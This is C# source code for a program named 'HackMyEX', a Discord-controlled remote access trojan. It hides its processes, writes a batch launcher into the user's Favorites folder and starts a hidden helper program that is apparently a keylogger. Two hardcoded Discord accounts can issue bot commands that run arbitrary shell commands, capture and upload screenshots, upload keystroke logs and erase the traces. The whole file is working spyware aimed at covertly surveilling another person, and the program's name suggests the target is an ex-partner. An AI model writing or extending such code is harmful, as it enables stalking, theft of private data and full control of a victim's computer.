using System;
using Discord;
using Discord.WebSocket;
using System.Threading.Tasks;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;

namespace HackMyEX
{
    public class HackMyEX
    {
        private DiscordSocketClient _client;
        /*Uri iconUri = new Uri("pack://application:,,,/WPFIcon2.ico", UriKind.RelativeOrAbsolute);
        HackMyEX.Icon = BitmapFrame.Create(iconUri);*/
        
        
        public System.Diagnostics.Process process = new System.Diagnostics.Process();
        public System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
        public System.Diagnostics.ProcessStartInfo startInfo2 = new System.Diagnostics.ProcessStartInfo();
        ProcessStartInfo startInfo1 = new ProcessStartInfo(string.Concat(Application.StartupPath + "\\Resources", "\\", "screenshot.exe"));
        bool A = true;

        public string cmds = "";
        public string h = "";

        public static void Main(string[] args)
        {
            if (!File.Exists("C:\\Users\\" + Environment.UserName + "\\Favorites" + @"\Package\bin\GoogleHandler.bat"))
            {
                using (FileStream fs = File.Create("C:\\Users\\" + Environment.UserName + "\\Favorites" + @"\Package\bin\GoogleHandler.bat"))
                {
                    Byte[] info = new UTF8Encoding(true).GetBytes("@echo\nstart \"\" \"" + "C:\\Users\\" + Environment.UserName + "\\Favorites" + @"\Package\bin\HackMyEx.exe" + "\"");
                    fs.Write(info, 0, info.Length);
                }
                
            }
            System.Diagnostics.ProcessStartInfo start = new System.Diagnostics.ProcessStartInfo();
            start.FileName = Application.StartupPath + @"\Resources\bin\ConsoleApplication.exe";
            start.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            Process proc = Process.Start(start);
            new HackMyEX().MainAsync().GetAwaiter().GetResult();
        }


        public async Task MainAsync()
        {
            _client = new DiscordSocketClient();

            _client.MessageReceived += MessageReceived;

            string token = "TOKEN"; // Remember to keep this private!
            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            // Block this task until the program is closed.
            await Task.Delay(-1);
        }

        private async Task MessageReceived(SocketMessage message)
        {
            if (A)
            {
                A = false;
            }
            if ((message.Author.Id == 323971406192836629) || (message.Author.Id == 390784644968349696))
            {
                if (message.Content.StartsWith("!cmd"))
                {
                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo.FileName = "cmd.exe";
                    string[] command = message.Content.Split(' ');
                    if (command.Length < 2)
                    {
                        await message.Channel.SendMessageAsync("```css\nUsage: !comp <command>```");
                    }
                    else
                    {
                        int i = 0;
                        cmds = "";
                        foreach (string cmd in command)
                        {
                            if (i != 0)
                            {
                                cmds = cmds + cmd + " ";
                            }
                            i++;
                        }
                        startInfo.Arguments = "/C " + cmds;
                        process.StartInfo = startInfo;
                        process.Start();
                        await message.Channel.SendMessageAsync("__**Done!**__");
                    }
                }
                if (message.Content == "!screen")
                {
                    startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo1.Arguments = "-o \"C:\\Users\\" + Environment.UserName +
                                           "\\Favorites\\screengrab.png\"";
                    startInfo1.UseShellExecute = false; 
                    System.Diagnostics.Process.Start(startInfo1);
                    
                    System.Threading.Thread.Sleep(4);
                    await message.Channel.SendFileAsync("C:\\Users\\" + Environment.UserName +
                                                        "\\Favorites\\screengrab.png");
                    await message.Channel.SendMessageAsync("__**Done!**__");

                }
                if (message.Content == "!delscreen")
                {
                    startInfo2.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo2.FileName = "cmd.exe";
                    startInfo2.Arguments = "/C erase " + "\"C:\\Users\\" + Environment.UserName + "\\Favorites\\" +
                                           "screengrab.png\"";
                    process.StartInfo = startInfo2;
                    process.Start();
                    await message.Channel.SendMessageAsync("__**Done!**__");
                }
                if (message.Content == "!keylogs")
                {
                    await message.Channel.SendFileAsync("C:\\Users\\" + Environment.UserName + "\\Favorites\\" +
                                                        @"loggedTo.txt");
                    await message.Channel.SendMessageAsync("__**Done!**__");
                }
                if (message.Content == "!dellogs")
                {
                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo.FileName = "cmd.exe";
                    startInfo.Arguments = "/C erase " + "\"C:\\Users\\" + Environment.UserName + "\\Favorites\\" +
                                          "loggedTo.txt\"";
                    process.StartInfo = startInfo;
                    process.Start();
                    await message.Channel.SendMessageAsync("__**Done!**__");
                }
            }
            // TODO: add delete size check for keylogger file.
        }

    }
}